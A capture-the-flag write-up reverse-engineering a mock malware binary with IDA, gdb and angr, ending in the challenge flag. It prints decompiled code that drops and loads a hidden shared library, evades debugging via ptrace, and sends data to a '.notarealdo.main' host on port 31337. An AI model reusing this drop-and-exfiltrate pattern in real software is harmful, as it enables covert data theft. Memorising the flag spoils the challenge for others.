# C&C Music Factory

## Description

We've recovered a portion of the payload of a targeted malware campaign aimed at recording executives. Can you pull out the server it is trying to exfiltrate data to?

### Hints

* Only submit the subdomain as the flag
* Some of the control flow looks pretty convoluted... maybe you can patch your way through it instead?

## Analyze Binary `music_factory`

The challenge gives a binary `music_factory`.

```shell
❯ file music_factory
music_factory: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=3e9f77fbea88aa6595f107d25751f910d6378bb3, not stripped
```

Let's run the binary.

```shell
❯ ./music_factory
[1]  + 4052 segmentation fault  ./music_factory
```

Hmm, something is wrong here. I cannot run the binary...

I load the binary into IDA, check Strings tab, and find out the string **Welcome to music library** is called from `main`.

<img width="571" height="106" alt="image" src="https://github.com/user-attachments/assets/2234626b-7262-420a-8513-712b569bbf53" />

<img width="992" height="142" alt="image" src="https://github.com/user-attachments/assets/4441846b-c9ee-44f9-867d-07f4d27efec3" />

The `main` function is short, and easy to understand. If the value of `mix_tape` is not `0`, there are two ***"weird"*** function calls.

<img width="924" height="807" alt="image" src="https://github.com/user-attachments/assets/8e20d91c-38a1-41cd-a3ec-a2c6a4210f69" />

Two functions `qword_202050` and `qword_202058` are xrefed from `libc_csu_init_`.

<img width="1061" height="141" alt="image" src="https://github.com/user-attachments/assets/18a729ec-f0cf-498a-a28c-bc24df3274c3" />

Here is the pseudo-code of `libc_csu_init_` from IDA.

```c
unsigned __int64 libc_csu_init_()
{
  unsigned int ptr; // [rsp+4h] [rbp-3Ch] BYREF
  FILE *stream; // [rsp+8h] [rbp-38h]
  __int64 v3; // [rsp+10h] [rbp-30h]
  size_t size; // [rsp+18h] [rbp-28h]
  void *v5; // [rsp+20h] [rbp-20h]
  FILE *s; // [rsp+28h] [rbp-18h]
  void *handle; // [rsp+30h] [rbp-10h]
  unsigned __int64 v8; // [rsp+38h] [rbp-8h]

  v8 = __readfsqword(0x28u);
  if ( ptrace(PTRACE_TRACEME, 0, 1, 0) == -1 )
    exit(-1);
  stream = fopen("/tmp/music_factory", "rb");
  fseek(stream, 0, 2);
  v3 = ftell(stream);
  rewind(stream);
  fseek(stream, v3 - 4, 0);
  fread(&ptr, 4u, 1u, stream);
  rewind(stream);
  fseek(stream, ptr, 0);
  size = v3 - ptr;
  v5 = malloc(size);
  fread(v5, size, 1u, stream);
  fclose(stream);
  s = fopen("/tmp/libmusiclibrary.so", "wb");
  fwrite(v5, size, 1u, s);
  fclose(s);
  free(v5);
  chmod("/tmp/libmusiclibrary.so", 0x1FFu);
  handle = load_music_library("/tmp/libmusiclibrary.so");
  if ( handle )
  {
    mix_tape = 1;
    qword_202048 = (__int64)handle;
    qword_202058 = (__int64 (__fastcall *)(_QWORD))dlsym(handle, "buildTree");
    qword_202050 = (__int64 (__fastcall *)(_QWORD))dlsym(handle, "factory");
  }
  else
  {

 puts("Failed to load libmusiclibrary");
  }
  return __readfsqword(0x28u) ^ v8;
}
```

Now things are clear. In this function, it tries to open `/tmp/music_factory`, but since I don't have the binary `music_factory` in `tmp` folder, it prints out the message **"[1]  + 4052 segmentation fault  ./music_factory"**.

Also, what catches my attention is that after it successfully opens `/tmp/music_factory`, it writes some data to `/tmp/libmusiclibrary.so` library. And the two functions `qword_202050` and `qword_202058` are named `factory` and `buildTree` respectively in the shared object library `/tmp/libmusiclibrary.so`.

```c
handle = load_music_library("/tmp/libmusiclibrary.so");
if ( handle )
{
  mix_tape = 1;
  qword_202048 = (__int64)handle;
  qword_202058 = (__int64 (__fastcall *)(_QWORD))dlsym(handle, "buildTree");
  qword_202050 = (__int64 (__fastcall *)(_QWORD))dlsym(handle, "factory");
}
```

Let's extract and get that shared object lirbary.

## Shared Object Library `/tmp/libmusiclibrary.so`

Before that, I need to create the binary `music_factory` in `tmp` folder.

```shell
❯ cp music_factory /tmp
```

To get `/tmp/libmusiclibrary.so`, I use `gdb` to examine the behaviour of the program.

```shell
❯ gdb music_factory
...
(gdb) set pagination off
(gdb) set disassembly-flavor intel
(gdb) b libc_csu_init_
Breakpoint 1 at 0xb63
(gdb) r
Starting program: /mnt/d/Github/angr-note/CandCMusicFactory/music_factory
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

Breakpoint 1, 0x0000555555400b63 in libc_csu_init_ ()
```

After successfully entering `libc_csu_init_` function. I add a breakpoint after `fclose` like in the following picture, where the `/tmp/libmusiclibrary.so` is ready.

<img width="944" height="649" alt="image" src="https://github.com/user-attachments/assets/519a4b48-2da9-4c1f-afeb-cc2ac9f396ff" />

<img width="933" height="393" alt="image" src="https://github.com/user-attachments/assets/0b758324-8670-4e13-a51e-8cefb3b1d77a" />

&rarr; So the offset is `0xCD2`.

However, the process terminates immediately.

```shell
(gdb) b * 0x0000555555400cd2
Breakpoint 2 at 0x555555400cd2
(gdb) c
Continuing.
[Inferior 1 (process 4140) exited with code 0377]
```

In the **Description**, it states that the binary is a form of **malware**. This means there must be **an anti-debug technique**.

Luckily enough, I easily find it out from the pseudo-code of `libc_csu_init_` function.

```c
if ( ptrace(PTRACE_TRACEME, 0, 1, 0) == -1 )
  exit(-1);
```

Here is this part in assembly.

```asm
cmp     rax, 0FFFFFFFFFFFFFFFFh
jnz     short loc_BA4
mov     edi, 0FFFFFFFFh ; status
call    _exit
```

Clearly, when `rax` is `-1`, it calls `exit`, which terminates the program. 

To tackle this, I patch the value of `rax` to `0` when reaching the instruction `cmp rax, 0FFFFFFFFFFFFFFFFh`.

```shell
(gdb) disassemble libc_csu_init_
...
   0x0000555555400b8f <+48>:    call   0x5555554009b0 <ptrace@plt>
   0x0000555555400b94 <+53>:    cmp    rax,0xffffffffffffffff
   0x0000555555400b98 <+57>:    jne    0x555555400ba4 <libc_csu_init_+69>
...
(gdb) b * 0x0000555555400b94
Breakpoint 2 at 0x555555400b94
(gdb) c
Continuing.

Breakpoint 2, 0x0000555555400b94 in libc_csu_init_ ()
(gdb) set $rax=0
(gdb) info registers
rax            0x0                 0
...
```

Now, everything should be ready. I set a breakpoint after `fclose` to get `/tmp/libmusiclibrary.so`.

```shell
(gdb) disassemble libc_csu_init_
...
   0x0000555555400cc6 <+359>:   mov    rax,QWORD PTR [rbp-0x18]
   0x0000555555400cca <+363>:   mov    rdi,rax
   0x0000555555400ccd <+366>:   call   0x555555400940 <fclose@plt>
   0x0000555555400cd2 <+371>:   mov    rax,QWORD PTR [rbp-0x20]
   0x0000555555400cd6 <+375>:   mov    rdi,rax
   0x0000555555400cd9 <+378>:   call   0x555555400900 <free@plt>
...
(gdb) b * 0x0000555555400cd2
Breakpoint 3 at 0x555555400cd2
(gdb) c
Continuing.

Breakpoint 3, 0x0000555555400cd2 in libc_csu_init_ ()
```

The `/tmp/libmusiclibrary.so` has been created successfully.

```shell
❯ file /tmp/libmusiclibrary.so
/tmp/libmusiclibrary.so: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, BuildID[sha1]=30c5867b498f6868cfc83482fb8dbac68801fb77, stripped
```

I copy this file to current working directory, and start analyzing `factory` and `buildTree`.

There is nothing interesting about `buildTree`.

```c
int buildTree()
{
  _QWORD *v1; // [rsp+8h] [rbp-38h]
  _QWORD *v2; // [rsp+10h] [rbp-30h]
  _QWORD *v3; // [rsp+18h] [rbp-28h]
  _QWORD *v4; // [rsp+20h] [rbp-20h]
  _QWORD *v5; // [rsp+28h] [rbp-18h]
  _QWORD *v6; // [rsp+30h] [rbp-10h]
  _QWORD *v7; // [rsp+38h] [rbp-8h]

  v1 = sub_F1A();
  *(_BYTE *)v1 = 23;
  v1[7] = sub_F4C;
  qword_2021C8 = (__int64)v1;
  v2 = sub_F1A();
  *(_BYTE *)v2 = -121;
  v2[7] = sub_F4C;
  v3 = sub_F1A();
  *(_BYTE *)v3 = 50;
  v3[7] = sub_1547;
  v4 = sub_F1A();
  *(_BYTE *)v4 = -122;
  v4[7] = sub_1647;
  v5 = sub_F1A();
  *(_BYTE *)v5 = 69;
  v5[7] = sub_157B;
  v6 = sub_F1A();
  *(_BYTE *)v6 = 33;
  v6[7] = sub_13AA;
  v7 = sub_F1A();
  *(_BYTE *)v7 = 117;
  v7[7] = sub_1020;
  v1[5] = v2;
  v2[3] = v1;
  v2[5] = -1;
  v2[6] = -1;
  v1[6] = v4;
  v4[4] = v1;
  v4[5] = v6;
  v6[3] = v4;
  v4[6] = v3;
  v3[4] = v4;
  v3[6] = -1;
  v3[5] = -1;
  v6[5] = v2;
  v2[4] = v6;
  v6[6] = v5;
  v5[4] = v6;
  v5[5] = v7;
  v7[3] = v5;
  v5[6] = -1;
  qword_2021C0 = (__int64)sub_F1A();
  return puts("Init Complete");
}
```

However, in function `factory`, there is a call to `sub_11A1` at the end which catches my attention!

```c
unsigned __int64 factory()
{
  char v1; // [rsp+6h] [rbp-Ah]
  char v2; // [rsp+7h] [rbp-9h]
  __int64 v3; // [rsp+8h] [rbp-8h]

  v1 = 0;
  v3 = qword_2021C8;
  while ( v3 )
  {
    v2 = (*(__int64 (**)(void))(v3 + 56))();
    *(_BYTE *)v3 ^= v2;
    v1 ^= v2 & 1;
    if ( v1 == 1 )
      v3 = *(_QWORD *)(v3 + 48);
    else
      v3 = *(_QWORD *)(v3 + 40);
    if ( v3 == -1 )
      return 0;
  }
  return sub_11A1();
}
```

This is `sub_11A1`.

```c
unsigned __int64 sub_11A1()
{
  unsigned int i; // [rsp+8h] [rbp-138h]
  int fd; // [rsp+Ch] [rbp-134h]
  struct addrinfo *pai; // [rsp+10h] [rbp-130h] BYREF
  __int64 j; // [rsp+18h] [rbp-128h]
  _BYTE v5[16]; // [rsp+20h] [rbp-120h] BYREF
  char s[264]; // [rsp+30h] [rbp-110h] BYREF
  unsigned __int64 v7; // [rsp+138h] [rbp-8h]

  v7 = __readfsqword(0x28u);
  sub_1112(qword_2021C8, 0);
  for ( i = 0; i <= 0x3F; ++i )
    aG[i] ^= byte_2021D0[i % 7];
  memset(s, 0, 0x100u);
  sprintf(s, "%s.notarealdo.main", aG);
  fd = socket(2, 1, 0);
  if ( fd == -1 )
    exit(0);
  bzero(v5, 0x10u);
  if ( getaddrinfo(s, "31337", 0, &pai) )
  {
    if ( connect(fd, pai->ai_addr, 8u) )
      exit(0);
    for ( j = qword_2021C0; *(_QWORD *)(j + 40); j = *(_QWORD *)(j + 40) )
    {
      if ( *(_QWORD *)(j + 16) )
        write(fd, *(const void **)(j + 16), *(_QWORD *)(j + 8));
    }
  }
  close(fd);
  return __readfsqword(0x28u) ^ v7;
}
```

As you can see from the code above, it creates **a socket** and **a domain name** (`%s.notarealdo.main`).

```c
sprintf(s, "%s.notarealdo.main", aG);
fd = socket(2, 1, 0);
```

Referring to **Description**, it states that ***"Can you pull out the server it is trying to exfiltrate data to?"***. This means I have to find the server! From the code above, it is noticeable that the server is the variable `aG`.

So, function `sub_11A1` is my target, and I use **angr** to solve this one!

## Solution

Here, I use `gdb` to create a **core-file**, where it starts from the `factory` function in `/tmp/libmusiclibrary.so`. 

```shell
(gdb) break factory
Breakpoint 5 at 0x7ffff78016ac
(gdb) c
Continuing.
Welcome to music library
Init Complete

Breakpoint 5, 0x00007ffff78016ac in factory () from /tmp/libmusiclibrary.so
(gdb) disassemble factory
Dump of assembler code for function factory:
   0x00007ffff78016a8 <+0>:     push   rbp
   0x00007ffff78016a9 <+1>:     mov    rbp,rsp
=> 0x00007ffff78016ac <+4>:     sub    rsp,0x10
   0x00007ffff78016b0 <+8>:     mov    BYTE PTR [rbp-0xa],0x0
...
(gdb) generate-core-file
Saved corefile core.1747
```

So, when loading the **core-file** into **angr**, the address should start at offset `0x16ac`.

Let's test it out!

```python
import angr 
import logging 
import claripy

logging.getLogger("angr").setLevel(logging.INFO)

def hook(l=None):
    if l:
        locals().update(l)
    import IPython
    IPython.embed(banner1='', exit_msg='', confirm_exit=False)
    exit(0)

proj = angr.Project("./core.1747")

hook(locals())
```

Here, I use `IPython` to help me interact with the **core-file**.

```python
In [1]: proj
Out[1]: <Project ./core.1747>

In [2]: simgr = proj.factory.simgr()
ERROR    | 2025-08-22 02:26:37,740 | angr.simos.simos | What is this register cs I have to translate?
ERROR    | 2025-08-22 02:26:37,741 | angr.simos.simos | What is this register ss I have to translate?
ERROR    | 2025-08-22 02:26:37,741 | angr.simos.simos | What is this register fs_base I have to translate?
ERROR    | 2025-08-22 02:26:37,741 | angr.simos.simos | What is this register gs_base I have to translate?
ERROR    | 2025-08-22 02:26:37,741 | angr.simos.simos | What is this register ds I have to translate?
ERROR    | 2025-08-22 02:26:37,741 | angr.simos.simos | What is this register es I have to translate?

In [3]: simgr
Out[3]: <SimulationManager with 1 active>

In [4]: simgr.active[0]
Out[4]: <SimState @ 0x7ffff78016ac>
```

Nice, the project starts at offset `0x16ac` as I have expected.

Since I have to rebase the address when working between IDA and angr, I create a `rebase` function as follow.

```python
def rebase(addr):
    return 0x7ffff78016ac - 0x16AC + addr
```

Have a quick look over function `factory`:

- There's a loop working on the value of `v3`.
- The value of `v3` is changed by the return value of a function created at runtime: `(*(__int64 (**)(void))(v3 + 56))()`.
- When `v3` becomes `0`, it goes to the target function `sub_11A1`.

So, I have a quick test to see if **angr** can figure out the path to function `sub_11A1` for me. Note that the offset of `sub_11A1` in IDA is `0x1731`.

```asm
.text:000000000000172C                 mov     eax, 0
.text:0000000000001731                 call    sub_11A1
```

This is how I test in `IPython`.

```python
In [5]: rebase(0x1731)
Out[5]: 140737345754929

In [6]: simgr.explore(find=140737345754929)
INFO     | 2025-08-22 02:41:45,646 | angr.sim_manager | Stepping active of <SimulationManager with 1 active>
INFO     | 2025-08-22 02:41:45,661 | angr.engines.successors | Ticked state: <IRSB from 0x7ffff78016ac: 1 sat>
INFO     | 2025-08-22 02:41:45,661 | angr.sim_manager | Stepping active of <SimulationManager with 1 active>
INFO     | 2025-08-22 02:41:45,665 | angr.engines.successors | Ticked state: <IRSB from 0x7ffff7801725: 1 sat 1 unsat>
INFO     | 2025-08-22 02:41:45,665 | angr.sim_manager | Stepping active of <SimulationManager with 1 active>
INFO     | 2025-08-22 02:41:45,668 | angr.engines.successors | Ticked state: <IRSB from 0x7ffff78016c1: 1 sat>
INFO     | 2025-08-22 02:41:45,669 | angr.sim_manager | Stepping active of <SimulationManager with 1 active>
INFO     | 2025-08-22 02:41:45,671 | angr.engines.successors | Ticked state: <IRSB from 0x7ffff7800f4c: 1 sat>
INFO     | 2025-08-22 02:41:45,672 | angr.sim_manager | Stepping active of <SimulationManager with 1 active>
INFO     | 2025-08-22 02:41:45,673 | angr.engines.successors | Ticked state: <IRSB from 0x7ffff7800d50: 1 sat>
INFO     | 2025-08-22 02:41:45,673 | angr.sim_manager | Stepping active of <SimulationManager with 1 active>
INFO     | 2025-08-22 02:41:45,675 | angr.engines.successors | Ticked state: <IRSB from 0x7ffff7800d56: 1 sat>
INFO     | 2025-08-22 02:41:45,675 | angr.sim_manager | Stepping active of <SimulationManager with 1 active>
INFO     | 2025-08-22 02:41:45,677 | angr.engines.successors | Ticked state: <IRSB from 0x7ffff7800c30: 1 sat>
INFO     | 2025-08-22 02:41:45,677 | angr.sim_manager | Stepping active of <SimulationManager with 1 active>
INFO     | 2025-08-22 02:41:45,689 | angr.engines.successors | Ticked state: <IRSB from 0x7ffff7fda2f0: 1 sat>
INFO     | 2025-08-22 02:41:45,689 | angr.sim_manager | Stepping active of <SimulationManager with 1 active>
Out[6]: <SimulationManager with all stashes empty (1 errored)>

In [7]: simgr.errored[0]
Out[7]: <State errored with "IR decoding error at 0x7ffff7fda35c. You can hook this instruction with a python replacement using project.hook(0x7ffff7fda35c, your_function, length=length_of_instruction).">
```

Ok... I get an error ***"IR decoding error at 0x7ffff7fda35c"***. This error means that **angr** tries to jump to an invalid function address. When I check the offset `0xa35c` in the binary, it doesn't exist!

<img width="446" height="119" alt="image" src="https://github.com/user-attachments/assets/93e199d7-1a33-40c9-af0f-499d869b6468" />

<img width="1012" height="209" alt="image" src="https://github.com/user-attachments/assets/7c38a64a-c80e-4021-bca0-ebdfbaff7e24" />

I check the function `factory` again, and see that this part might be the reason!

<img width="508" height="514" alt="image" src="https://github.com/user-attachments/assets/cf823731-748c-4cde-9955-edf43dd43b3a" />

Here is the assembly code of that part.

```asm
.text:00000000000016C1 loc_16C1:                               ; CODE XREF: factory+82↓j
.text:00000000000016C1                 mov     rax, [rbp+var_8]
.text:00000000000016C5                 mov     rdx, [rax+38h]
.text:00000000000016C9                 mov     eax, 0
.text:00000000000016CE                 call    rdx             ; function call
.text:00000000000016D0                 mov     [rbp+var_9], al
```

`rdx` is the function address, and it is crafted via `v3` and `0x38`. If `rdx` is **symbolic**, it might jump to **an undefined location** in the binary as shown above.

Instead of jumping to function `sub_11A1`, I decide to jump to offset `0x16CE` where it performs `call rdx`.

```python
In [2]: rebase(0x16ce)
Out[2]: 140737345754830

In [3]: simgr.explore(find=140737345754830)
INFO     | 2025-08-22 03:00:52,235 | angr.sim_manager | Stepping active of <SimulationManager with 1 active>
INFO     | 2025-08-22 03:00:52,250 | angr.engines.successors | Ticked state: <IRSB from 0x7ffff78016ac: 1 sat>
INFO     | 2025-08-22 03:00:52,251 | angr.sim_manager | Stepping active of <SimulationManager with 1 active>
INFO     | 2025-08-22 03:00:52,255 | angr.engines.successors | Ticked state: <IRSB from 0x7ffff7801725: 1 sat 1 unsat>
INFO     | 2025-08-22 03:00:52,255 | angr.sim_manager | Stepping active of <SimulationManager with 1 active>
INFO     | 2025-08-22 03:00:52,258 | angr.engines.successors | Ticked state: <IRSB from 0x7ffff78016c1: 1 sat>
INFO     | 2025-08-22 03:00:52,258 | angr.sim_manager | Stepping active of <SimulationManager with 1 active>
Out[3]: <SimulationManager with 1 found>

In [4]: simgr.found[0]
Out[4]: <SimState @ 0x7ffff78016ce>
```

I successfully reach the offset `0x16ce`.

This is the function address stored in `rdx`.

```python
In [5]: simgr.found[0].regs.rdx
Out[5]: <BV64 0x7ffff7800f4c>
```

I check IDA, and there is indeed a function at offset `0x0F4C`. This function returns `17`.

```c
__int64 sub_F4C()
{
  sleep(1u);
  return 17;
}
```

Since the return value of `call rdx` is later affect the while loop, especially `v3`, I decide to create a hook for `call rdx` and make return value `rax` symbolic.

```python
import angr 
import logging 
import claripy

logging.getLogger("angr").setLevel(logging.INFO)

def hook(l=None):
    if l:
        locals().update(l)
    import IPython
    IPython.embed(banner1='', exit_msg='', confirm_exit=False)
    exit(0)

def rebase(addr):
    return 0x7ffff78016ac - 0x16AC + addr

proj = angr.Project("./core.1747")

# addr      return
# 0xF4C     17

def perform_check(state):
    # Check if rdx is symbolic
    check_func = state.regs.rdx
    if state.solver.symbolic(check_func):
        print("Symbolic rdx")
        hook(locals())

    # Create symbolic return values
    check_func = state.solver.eval_one(check_func)
    print("rdx = {:016x}".format(check_func))
    ret_val = claripy.BVS("ret_val_{:016x}".format(check_func), 8*8)
    state.regs.rax = ret_val
    collection = state.globals.get('return_values', []).copy()
    collection.append(ret_val)
    state.globals['return_values'] = collection

    # Mapping between function call (rdx) and return value (rax)
    if check_func == rebase(0xF4C):
        state.solver.add(ret_val == 17)
    else:
        print("No return value")
        hook(locals())

# Hook
proj.hook(addr=rebase(0x16CE), hook=perform_check, length=2)

# target = rebase(0x16CE)
target = rebase(0x1731)
simgr = proj.factory.simgr()
simgr.explore(find=target)

hook(locals())
```

Run the script and it reaches a new function address.

<img width="1811" height="447" alt="image" src="https://github.com/user-attachments/assets/1d793386-caba-4bff-b98e-6bdbdd54b49b" />

There is indeed a function at offset `0x1647`, and it returns `32` and `115`.

```c
__int64 sub_1647()
{
  time_t timer; // [rsp+8h] [rbp-18h] BYREF
  struct tm *v2; // [rsp+10h] [rbp-10h]
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  time(&timer);
  v2 = localtime(&timer);
  if ( v2->tm_hour <= 19 )
    return 32;
  else
    return 115;
}
```

So I do the same thing, add this function and its return values into my code and let's **angr** do it job.

```python
if check_func == rebase(0xF4C):
  state.solver.add(ret_val == 17)
elif check_func == rebase(0x1647):
  state.solver.add(claripy.Or(
    ret_val == 32,
    ret_val == 115
  ))
else:
  print("No return value")
  hook(locals())
```

Since the script figures out lots of new function addresses, I create a table like below for demonstration.

| rdx      | return value           |
| -------- | -------                |
| 0xF4C    | 17                     |
| 0x1647   | 32, 115                |
| 0x13aa   | 16, 4294967169         |
| 0x1547   | 112, 4294967185        |
| 0x157b   | 4294967233, 0          |
| 0x1020   | 4294967232, 4294967251 |

Run the script from [here](./solve.py), and see **angr** does magic :D

Now, I have successfully reach the function `sub_11A1` at offset `0x1731`.

```python
In [1]: simgr
Out[1]: <SimulationManager with 1 active, 4 unconstrained, 1 found>

In [2]: simgr.found[0]
Out[2]: <SimState @ 0x7ffff7801731>
```

Let's see what I get from the return value.

```python
In [3]: simgr.found[0].globals['return_values']
Out[3]:
[<BV64 ret_val_00007ffff7800f4c_0_64>,
 <BV64 ret_val_00007ffff7801647_1_64>,
 <BV64 ret_val_00007ffff78013aa_2_64>,
 <BV64 ret_val_00007ffff780157b_9_64>,
 <BV64 ret_val_00007ffff7801020_14_64>]

In [4]: for rdx in simgr.found[0].globals['return_values']:
   ...:     print(rdx, simgr.found[0].solver.eval_one(rdx))
   ...:
<BV64 ret_val_00007ffff7800f4c_0_64> 17
<BV64 ret_val_00007ffff7801647_1_64> 115
<BV64 ret_val_00007ffff78013aa_2_64> 4294967169
<BV64 ret_val_00007ffff780157b_9_64> 4294967233
<BV64 ret_val_00007ffff7801020_14_64> 4294967232
```

So, these are the return values from `call rdx`, which **angr** has figured out to help me reach the function `sub_11A1`.

Now I just open `gdb` and change the return value of `call rdx` whenever execution reaches it, using the return values I got earlier from **angr**.

```shell
(gdb) disassemble factory
...
   0x00007ffff78016c1 <+25>:    mov    rax,QWORD PTR [rbp-0x8]
   0x00007ffff78016c5 <+29>:    mov    rdx,QWORD PTR [rax+0x38]
   0x00007ffff78016c9 <+33>:    mov    eax,0x0
   0x00007ffff78016ce <+38>:    call   rdx
   0x00007ffff78016d0 <+40>:    mov    BYTE PTR [rbp-0x9],al
   0x00007ffff78016d3 <+43>:    mov    rax,QWORD PTR [rbp-0x8]
...
(gdb) b * 0x00007ffff78016d0
Breakpoint 5 at 0x7ffff78016d0
(gdb) c
Continuing.

Breakpoint 5, 0x00007ffff78016d0 in factory () from /tmp/libmusiclibrary.so
(gdb) set $rax=17
(gdb) c
Continuing.

Breakpoint 5, 0x00007ffff78016d0 in factory () from /tmp/libmusiclibrary.so
(gdb) set $rax=115
(gdb) c
Continuing.

Breakpoint 5, 0x00007ffff78016d0 in factory () from /tmp/libmusiclibrary.so
(gdb) set $rax=4294967169
(gdb) c
Continuing.

Breakpoint 5, 0x00007ffff78016d0 in factory () from /tmp/libmusiclibrary.so
(gdb) set $rax=4294967233
(gdb) c
Continuing.

Breakpoint 5, 0x00007ffff78016d0 in factory () from /tmp/libmusiclibrary.so
(gdb) set $rax=4294967232
```

Now, I set a breakpoint after `socket` at offset `0x1293` to make sure **the server `aG`** is ready.

```asm
======== Assembly ========

.text:000000000000125D                 lea     rax, [rbp+s]
.text:0000000000001264                 lea     rdx, aG         ; "G"
.text:000000000000126B                 lea     rsi, aSNotarealdoMai ; "%s.notarealdo.main"
.text:0000000000001272                 mov     rdi, rax        ; s
.text:0000000000001275                 mov     eax, 0
.text:000000000000127A                 call    _sprintf
.text:000000000000127F                 mov     edx, 0          ; protocol
.text:0000000000001284                 mov     esi, 1          ; type
.text:0000000000001289                 mov     edi, 2          ; domain
.text:000000000000128E                 call    _socket
.text:0000000000001293                 mov     [rbp+fd], eax

======== IPython ========

In [6]: rebase(0x1293)
Out[6]: 140737345753747

======== gdb ========

(gdb) set $rax=4294967232
(gdb) b * 140737345753747
Breakpoint 6 at 0x7ffff7801293
(gdb) c
Continuing.

Breakpoint 6, 0x00007ffff7801293 in ?? () from /tmp/libmusiclibrary.so
```

Find address of `aG` and get the flag!

<img width="1000" height="71" alt="image" src="https://github.com/user-attachments/assets/cb4c4da5-6fb0-4b7f-83a7-7d98a9b15a1c" />

<img width="370" height="76" alt="image" src="https://github.com/user-attachments/assets/f81ed7bb-ce15-4f5d-936c-2c4900b87cd6" />

<img width="385" height="48" alt="image" src="https://github.com/user-attachments/assets/77227b25-d635-4b65-95f1-1bcf4b8ee1ad" />

Flag: `ACI{3b*22c2b0wa84602#2a1a0a+66b}`

